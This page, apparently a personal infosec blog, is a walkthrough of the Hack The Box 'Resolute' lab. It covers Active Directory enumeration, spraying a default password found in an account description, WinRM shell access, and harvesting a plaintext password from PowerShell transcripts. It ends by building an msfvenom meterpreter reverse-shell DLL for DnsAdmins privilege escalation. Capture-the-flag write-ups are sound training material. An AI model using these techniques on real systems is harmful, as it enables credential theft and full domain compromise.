<!DOCTYPE html>
<html lang="">
    
    


    <head>
    <link href="https://gmpg.org/xfn/11" rel="profile">
    <meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta http-equiv="Cache-Control" content="public" />
<!-- Enable responsiveness on mobile devices -->
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
<meta name="generator" content="Hugo 0.80.0" />

    
    
    

<title>Hack The Box - Resolute • Haax - Personal Blog</title>


<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Hack The Box - Resolute"/>
<meta name="twitter:description" content="Resolute is a Windows machine considered easy/medium and Active Directory oriented. An anonymous login allows you to list accounts in the domain and identify a default password. Obtaining a shell thtough WinRM allows then to list the domain properties and to find a password for a user member of the local &ldquo;DnsAdmins&rdquo; group. Privilege escalation is done through a DLL hijacking."/>

<meta property="og:title" content="Hack The Box - Resolute" />
<meta property="og:description" content="Resolute is a Windows machine considered easy/medium and Active Directory oriented. An anonymous login allows you to list accounts in the domain and identify a default password. Obtaining a shell thtough WinRM allows then to list the domain properties and to find a password for a user member of the local &ldquo;DnsAdmins&rdquo; group. Privilege escalation is done through a DLL hijacking." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://haax9.github.io/en/walkthroughs/hackthebox/resolute/" />
<meta property="article:published_time" content="2020-06-06T00:00:00+00:00" />
<meta property="article:modified_time" content="2020-06-06T00:00:00+00:00" /><meta property="og:site_name" content="Haax - Personal Blog" />


    


<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/github.min.css">




<link rel="stylesheet" href="/css/hyde-hyde.css">
<link rel="stylesheet" href="/css/custom.css">
<link rel="stylesheet" href="/css/print.min.css" media="print">

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
    <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
    <!-- Icons -->
    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/apple-touch-icon-144-precomposed.png">
    <link rel="shortcut icon" href="/favicon.png">
    
<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
	ga('create', 'G-GB7QC0EDF8', 'auto');
	
	ga('send', 'pageview');
}
</script>

    
<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
	ga('create', 'G-GB7QC0EDF8', 'auto');
	
	ga('send', 'pageview');
}
</script>
<script async src='https://www.google-analytics.com/analytics.js'></script>

    

</head>


    <body >
        
<div class="sidebar">
  <div class="container ">
    <div class="sidebar-about">
      
      
          <a href="https://haax9.github.io/en">
          
          
          
          <div class="author-image">
            <img src="/img/icons/haax_logo.png" alt="Author Image" class="img--circle img--headshot element--center">
          </div>
          
          </a>
        
      <p class="site__description">
        <a href="https://haax9.github.io">
         Infosec articles &amp; CTF Writeups 
      </a>
      </p>
    </div>
    <div>
	<ul class="sidebar-nav">
		 
		 
			 
				<li>
					<a href="/en/articles/">
						<span>Articles</span>
					</a>
				</li>
			 
		 
			 
				<li>
					<a href="/en/walkthroughs/">
						<span>Walkthroughs</span>
					</a>
				</li>
			 
		 
			 
				<li>
					<a href="/en/writeups/">
						<span>Write-Ups</span>
					</a>
				</li>
			 
		 
			 
				<li>
					<a href="/en/about/">
						<span>About</span>
					</a>
				</li>
			 
		 
			 
				<li>
					<a href="/en/conferences/">
						<span>Conferences</span>
					</a>
				</li>
			 
		 
			 
				<li>
					<a href="https://cheatsheet.haax.fr">
						<span>Cheatsheet</span>
					</a>
				</li>
			 
		
		</li>
	</ul>
</div>

    <p>
      <section class="social">
	
	<a href="https://twitter.com/Haax9_" target="blank"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a>
	
	
	&nbsp;<a href="https://github.com/Haax9" target="blank"><i class="fab fa-github fa-lg" aria-hidden="true"></i></a>
	
	
	&nbsp;<a href="https://gitlab.com/Haax" target="blank"><i class="fab fa-gitlab fa-lg" aria-hidden="true"></i></a>
	
	
	
  &nbsp;<a href="https://www.root-me.org/Haax" target="blank" class="linklogo"><div class="rootme_logo logohover"></div></a>
  
	
  &nbsp;<a href="http://www.aperikube.fr" target="blank" class="linklogo"><div class="aperikube_logo logohover"></div></a>
  
	
	&nbsp;<a href="mailto:haax@mdamail.ch" target="blank"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a>
	
	
	
	&nbsp;<a href="https://haax.fr/en/index.xml" target="blank"><i class="fas fa-rss fa-lg" aria-hidden="true"></i></a>
	</section>

    </p>
    <div class="langSection">
      
      
      <a rel="alternate" href="/fr/walkthroughs/hackthebox/resolute/" hreflang="fr" lang="fr" class="langLink">Français</a>
      <a rel="alternate" href="/fr/walkthroughs/hackthebox/resolute/" hreflang="fr" lang="fr"><img src="/img/icons/logo_drapeau_france.png" alt="logo_fracne" class="logoFlag"/></a>
      </div>
    <p class="copyright">
      &copy; 2023 Haax.
      <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">Some Rights Reserved</a>.
      <br/>Built with
      <a href="https://gohugo.io">Hugo</a> ❤️ <a href="https://github.com/htr3n/hyde-hyde">hyde-hyde</a>.
      
    </p>
  </div>
  <div>
  </div>
</div>

        <div class="content container">
            
    <article>
  <header>
    <h1>Hack The Box - Resolute</h1>
    
    
<div class="post__meta">
    
    
      <i class="fas fa-calendar-alt"></i> Jun 6, 2020
    
    
    
    
    <br/>
    <i class="fas fa-clock"></i> 9 min read
</div>


  </header>
  <div class="post">
    <p>Resolute is a Windows machine considered easy/medium and Active Directory oriented. An anonymous login allows you to list accounts in the domain and identify a default password. Obtaining a shell thtough WinRM allows then to list the domain properties and to find a password for a user member of the local &ldquo;DnsAdmins&rdquo; group. Privilege escalation is done through a DLL hijacking.</p>
<p><strong>Disclaimer :</strong> It is a rather quick presentation that deliberately omits the various research areas. Only the actual results and a quick approach are presented.</p>
<h2 id="discovery--enumeration">Discovery / Enumeration</h2>
<p>A quick port scan gives us running services on the machine.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo nmap -sS -T4 -p0-10000 -sV -O -sC 10.10.10.169 -v 

Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.169
Host is up <span style="color:#f92672">(</span>0.13s latency<span style="color:#f92672">)</span>.
Not shown: <span style="color:#ae81ff">9988</span> closed ports
PORT     STATE SERVICE      VERSION
53/tcp   open  tcpwrapped
88/tcp   open  kerberos-sec Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2020-02-11 18:35:03Z<span style="color:#f92672">)</span>
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: megabank.local, Site: Default-First-Site-Name<span style="color:#f92672">)</span>
445/tcp  open  microsoft-ds Windows Server <span style="color:#ae81ff">2016</span> Standard <span style="color:#ae81ff">14393</span> microsoft-ds <span style="color:#f92672">(</span>workgroup: MEGABANK<span style="color:#f92672">)</span>
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: megabank.local, Site: Default-First-Site-Name<span style="color:#f92672">)</span>
3269/tcp open  tcpwrapped
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf       .NET Message Framing
</code></pre></div><p>We manage to retrieve the domain and the different services tell us that we&rsquo;re facing an Active Directory domain controler.</p>
<p>We quickly find that it is possible to request the AD without prior authentication. This behavior allow us to get several informations such as the user list. In the accounts description, we can see what seems to be a default password for the user marko, interesting !</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ enum4linux -a 10.10.10.169

 <span style="color:#f92672">=============================</span> 
|    Users on 10.10.10.169    |
 <span style="color:#f92672">=============================</span> 
Use of uninitialized value $global_workgroup in concatenation <span style="color:#f92672">(</span>.<span style="color:#f92672">)</span> or string at ./enum4linux.pl line 866.
index: 0x10b0 RID: 0x19ca acb: 0x00000010 Account: abigail  Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>  Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
index: 0xfbc RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>  Desc: Built-in account <span style="color:#66d9ef">for</span> administering the computer/domain
index: 0x10b4 RID: 0x19ce acb: 0x00000010 Account: angela Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>  Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
index: 0x10bc RID: 0x19d6 acb: 0x00000010 Account: annette  Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>  Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
index: 0x10bd RID: 0x19d7 acb: 0x00000010 Account: annika Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>  Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
index: 0x10b9 RID: 0x19d3 acb: 0x00000010 Account: claire Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>  Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
index: 0x10bf RID: 0x19d9 acb: 0x00000010 Account: claude Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>  Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>  Desc: A user account managed by the system.
index: 0x10b5 RID: 0x19cf acb: 0x00000010 Account: felicia  Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>  Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
index: 0x10b3 RID: 0x19cd acb: 0x00000010 Account: fred Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>  Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>  Desc: Built-in account <span style="color:#66d9ef">for</span> guest access to the computer/domain
index: 0x10b6 RID: 0x19d0 acb: 0x00000010 Account: gustavo  Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>  Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
index: 0xff4 RID: 0x1f6 acb: 0x00000011 Account: krbtgt Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>  Desc: Key Distribution Center Service Account
index: 0x10b1 RID: 0x19cb acb: 0x00000010 Account: marcus Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>  Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko Name: Marko Novak Desc: Account created. Password set to Welcome123!
index: 0x10c0 RID: 0x2775 acb: 0x00000010 Account: melanie  Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>  Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
index: 0x10c3 RID: 0x2778 acb: 0x00000010 Account: naoki  Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>  Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
index: 0x10ba RID: 0x19d4 acb: 0x00000010 Account: paulo  Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>  Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
index: 0x10be RID: 0x19d8 acb: 0x00000010 Account: per  Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>  Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
index: 0x10a3 RID: 0x451 acb: 0x00000210 Account: ryan  Name: Ryan Bertrand Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
index: 0x10b2 RID: 0x19cc acb: 0x00000010 Account: sally  Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>  Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
index: 0x10c2 RID: 0x2777 acb: 0x00000010 Account: simon  Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>  Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
index: 0x10bb RID: 0x19d5 acb: 0x00000010 Account: steve  Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>  Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
index: 0x10b8 RID: 0x19d2 acb: 0x00000010 Account: stevie Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>  Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
index: 0x10af RID: 0x19c9 acb: 0x00000010 Account: sunita Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>  Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
index: 0x10b7 RID: 0x19d1 acb: 0x00000010 Account: ulf  Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>  Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
index: 0x10c1 RID: 0x2776 acb: 0x00000010 Account: zach Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>  Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>

</code></pre></div><p><strong>Important</strong> : In order to avoid DNS resolution trouble, don&rsquo;t forget to add machine entries in the <code>resolv.conf</code> and <code>hosts</code> files.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 kalinux

10.10.10.169 megabank.local
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ cat /etc/resolv.conf 
search megabank.local
nameserver 10.10.10.169
</code></pre></div><h2 id="default-password-and-user-shell">Default password and user shell</h2>
<p>We indicates the note <code>Account created. Password set to Welcome123!</code> for user marko. At this stage, we can think about a default password set by system administrators.</p>
<p>We build a simple user wordlist based on the previously retrieved ones and try to log in with each of them.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ crackmapexec smb 10.10.10.169 -u user_list -p <span style="color:#e6db74">&#39;Welcome123!&#39;</span>
CME          10.10.10.169:445 RESOLUTE        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows 10.0 Build <span style="color:#ae81ff">14393</span> <span style="color:#f92672">(</span>name:RESOLUTE<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:MEGABANK<span style="color:#f92672">)</span>
CME          10.10.10.169:445 RESOLUTE        <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> MEGABANK<span style="color:#ae81ff">\a</span>bigail:Welcome123! STATUS_LOGON_FAILURE 
CME          10.10.10.169:445 RESOLUTE        <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> MEGABANK<span style="color:#ae81ff">\A</span>dministrator:Welcome123! STATUS_LOGON_FAILURE 
CME          10.10.10.169:445 RESOLUTE        <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> MEGABANK<span style="color:#ae81ff">\a</span>ngela:Welcome123! STATUS_LOGON_FAILURE 
CME          10.10.10.169:445 RESOLUTE        <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> MEGABANK<span style="color:#ae81ff">\a</span>nnette:Welcome123! STATUS_LOGON_FAILURE 
CME          10.10.10.169:445 RESOLUTE        <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> MEGABANK<span style="color:#ae81ff">\a</span>nnika:Welcome123! STATUS_LOGON_FAILURE 
CME          10.10.10.169:445 RESOLUTE        <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> MEGABANK<span style="color:#ae81ff">\c</span>laire:Welcome123! STATUS_LOGON_FAILURE 
CME          10.10.10.169:445 RESOLUTE        <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> MEGABANK<span style="color:#ae81ff">\c</span>laude:Welcome123! STATUS_LOGON_FAILURE 
CME          10.10.10.169:445 RESOLUTE        <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> MEGABANK<span style="color:#ae81ff">\D</span>efaultAccount:Welcome123! STATUS_LOGON_FAILURE 
CME          10.10.10.169:445 RESOLUTE        <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> MEGABANK<span style="color:#ae81ff">\f</span>elicia:Welcome123! STATUS_LOGON_FAILURE 
CME          10.10.10.169:445 RESOLUTE        <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> MEGABANK<span style="color:#ae81ff">\f</span>red:Welcome123! STATUS_LOGON_FAILURE 
CME          10.10.10.169:445 RESOLUTE        <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> MEGABANK<span style="color:#ae81ff">\G</span>uest:Welcome123! STATUS_LOGON_FAILURE 
CME          10.10.10.169:445 RESOLUTE        <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> MEGABANK<span style="color:#ae81ff">\g</span>ustavo:Welcome123! STATUS_LOGON_FAILURE 
CME          10.10.10.169:445 RESOLUTE        <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> MEGABANK<span style="color:#ae81ff">\k</span>rbtgt:Welcome123! STATUS_LOGON_FAILURE 
CME          10.10.10.169:445 RESOLUTE        <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> MEGABANK<span style="color:#ae81ff">\m</span>arcus:Welcome123! STATUS_LOGON_FAILURE 
CME          10.10.10.169:445 RESOLUTE        <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> MEGABANK<span style="color:#ae81ff">\m</span>arko:Welcome123! STATUS_LOGON_FAILURE 
CME          10.10.10.169:445 RESOLUTE        <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> MEGABANK<span style="color:#ae81ff">\m</span>elanie:Welcome123! 
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> KTHXBYE!
</code></pre></div><p>The user <code>melanie</code> is  then owned !
However, this account is not an administrator and possibilities for remote command execution are limited.
This is where WinRM (Windows Remote Management) comes in. It is a Microsoft HTTP service/protocol, based on WS-Management (SOAP) that allows remote administration of Windows machines.
Back to our nmap scan, the port <strong>5985</strong>, used by default by WinRM, is open.</p>
<p>Several ways to exploit it. I chose to use the following Ruby script.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#960050;background-color:#1e0010">$</span> cat winrm_shell<span style="color:#f92672">.</span>rb 
require <span style="color:#e6db74">&#39;winrm&#39;</span>

conn <span style="color:#f92672">=</span> <span style="color:#66d9ef">WinRM</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Connection</span><span style="color:#f92672">.</span>new(
  <span style="color:#e6db74">endpoint</span>: <span style="color:#e6db74">&#39;http://10.10.10.169:5985/wsman&#39;</span>,
  <span style="color:#e6db74">user</span>: <span style="color:#e6db74">&#39;MEGABANK\melanie&#39;</span>,
  <span style="color:#e6db74">password</span>: <span style="color:#e6db74">&#39;Welcome123!&#39;</span>,
)

command<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>

conn<span style="color:#f92672">.</span>shell(<span style="color:#e6db74">:powershell</span>) <span style="color:#66d9ef">do</span> <span style="color:#f92672">|</span>shell<span style="color:#f92672">|</span>
    <span style="color:#66d9ef">until</span> command <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;exit</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> <span style="color:#66d9ef">do</span>
        print <span style="color:#e6db74">&#34;PS &gt; &#34;</span>
        command <span style="color:#f92672">=</span> gets
        output <span style="color:#f92672">=</span> shell<span style="color:#f92672">.</span>run(command) <span style="color:#66d9ef">do</span> <span style="color:#f92672">|</span>stdout, stderr<span style="color:#f92672">|</span>
            <span style="color:#66d9ef">STDOUT</span><span style="color:#f92672">.</span>print stdout
            <span style="color:#66d9ef">STDERR</span><span style="color:#f92672">.</span>print stderr
        <span style="color:#66d9ef">end</span>
    <span style="color:#66d9ef">end</span>
    puts <span style="color:#e6db74">&#34;Exiting with code </span><span style="color:#e6db74">#{</span>output<span style="color:#f92672">.</span>exitcode<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
<span style="color:#66d9ef">end</span>
</code></pre></div><p>Which give the first machine access and the first flag !</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ruby winrm_shell.rb 
PS &gt; whoami
megabank<span style="color:#ae81ff">\m</span>elanie

PS &gt; type ../Desktop/user.txt
0cxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
PS &gt; 
</code></pre></div><h2 id="enumeration-and-second-account-compromission">Enumeration and second account compromission</h2>
<p>A quick enumeration phase about users and groups indicates that <code>ryan</code> is member of the <code>Contractors</code>group, which is also member of the local <code>DnsAdmins</code>group. This user could be interesting.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">PS &gt; net user ryan /domain
User name                    ryan
Full Name                    Ryan Bertrand
Comment                      
User<span style="color:#960050;background-color:#1e0010">&#39;</span>s comment               
Country/region code          <span style="color:#ae81ff">000</span> <span style="color:#f92672">(</span>System Default<span style="color:#f92672">)</span>
Account active               Yes
Account expires              Never

Password last set            2/22/2020 9:15:02 AM
Password expires             Never
Password changeable          2/23/2020 9:15:02 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      
Global Group memberships     *Domain Users         *Contractors          
The command completed successfully.
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">PS &gt; net localgroup DnsAdmins
Alias name     DnsAdmins
Comment        DNS Administrators Group

Members

-------------------------------------------------------------------------------
Contractors
The command completed successfully.
</code></pre></div><p>The next step is about file enumeration and information gathering. After several tries, we manage to get informations about the target account, left in a file on the disk.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">PS &gt; findstr /si ryan *.xml *.ini *.txt *.config *.sql *.php *.asp *.jsp *.bat *.vbs

PSTranscripts<span style="color:#ae81ff">\2</span>0191203<span style="color:#ae81ff">\P</span>owerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt:Username: MEGABANK<span style="color:#ae81ff">\r</span>yan
PSTranscripts<span style="color:#ae81ff">\2</span>0191203<span style="color:#ae81ff">\P</span>owerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt:RunAs User: MEGABANK<span style="color:#ae81ff">\r</span>yan
PSTranscripts<span style="color:#ae81ff">\2</span>0191203<span style="color:#ae81ff">\P</span>owerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt:PS&gt;ParameterBinding<span style="color:#f92672">(</span>Out-String<span style="color:#f92672">)</span>: name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;InputObject&#34;</span>; value<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;PS megabank\ryan@RESOLUTE Documents&gt; &#34;</span>
PSTranscripts<span style="color:#ae81ff">\2</span>0191203<span style="color:#ae81ff">\P</span>owerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt:PS megabank<span style="color:#ae81ff">\r</span>yan@RESOLUTE Documents&gt;
PSTranscripts<span style="color:#ae81ff">\2</span>0191203<span style="color:#ae81ff">\P</span>owerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt:&gt;&gt; ParameterBinding<span style="color:#f92672">(</span>Invoke-Expression<span style="color:#f92672">)</span>: name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Command&#34;</span>; value<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
</span><span style="color:#e6db74">PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt:Username: MEGABANK\ryan
</span><span style="color:#e6db74">PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt:RunAs User: MEGABANK\ryan
</span><span style="color:#e6db74">PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt:+ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
</span><span style="color:#e6db74">PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt:+ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
</span><span style="color:#e6db74">PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt:Username: MEGABANK\ryan
</span><span style="color:#e6db74">PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt:RunAs User: MEGABANK\ryan
</span><span style="color:#e6db74">findstr.exe : FINDSTR: Cannot open Windows\Panther\UnattendGC\diagerr.xml
</span><span style="color:#e6db74">    + CategoryInfo          : NotSpecified: (FINDSTR: Cannot...dGC\diagerr.xml:String) [], RemoteException
</span><span style="color:#e6db74">    + FullyQualifiedErrorId : NativeCommandError
</span><span style="color:#e6db74">FINDSTR: Cannot open Windows\Panther\UnattendGC\diagwrn.xml
</span><span style="color:#e6db74">FINDSTR: Cannot open Windows\PLA\System\System Diagnostics.xml
</span><span style="color:#e6db74">FINDSTR: Cannot open Windows\PLA\System\System Performance.xml
</span><span style="color:#e6db74">FINDSTR: Cannot open Windows\System32\Sysprep\Panther\diagerr.xml
</span><span style="color:#e6db74">FINDSTR: Cannot open Windows\System32\Sysprep\Panther\diagwrn.xml
</span></code></pre></div><p>By modifying the WinRM script used for the first user, we can get a new shell, using our fresh new access !</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">PS &gt; whoami
megabank<span style="color:#ae81ff">\r</span>yan
PS &gt; pwd

Path                   
----                   
C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\r</span>yan<span style="color:#ae81ff">\D</span>ocuments
</code></pre></div><h2 id="privilege-escalation---dll-hijacking">Privilege escalation - DLL Hijacking</h2>
<p>Some Internet research tells us a way to perform a privilege escalation on a Windows machine for a user who is a member of the <code>DnsAdmins</code> group.</p>
<p>It is indeed possible to have the DLL of our choice loaded by the DNS service. This DLL will then be executed with SYSTEM privilege.</p>
<p>The following resources explain the vulnerability:</p>
<ul>
<li><a href="https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise">https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise</a></li>
<li><a href="https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2">https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2</a></li>
</ul>
<p>First step, generate a DLL containing a reverse shell to our machine.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST<span style="color:#f92672">=</span>10.10.14.28 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">5566</span> -f dll &gt; privesc.dll

<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No encoder or badchars specified, outputting raw payload
Payload size: <span style="color:#ae81ff">510</span> bytes
Final size of dll file: <span style="color:#ae81ff">5120</span> bytes
</code></pre></div><p>Then, a simple and temporary SMB server, used to remotely load our DLL.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo smbserver.py MYSHARE /path/to/HackTheBox/Resolute -smb2support
Impacket v0.9.21.dev1+20200220.181330.03cbe6e8 - Copyright <span style="color:#ae81ff">2020</span> SecureAuth Corporation

<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Config file parsed
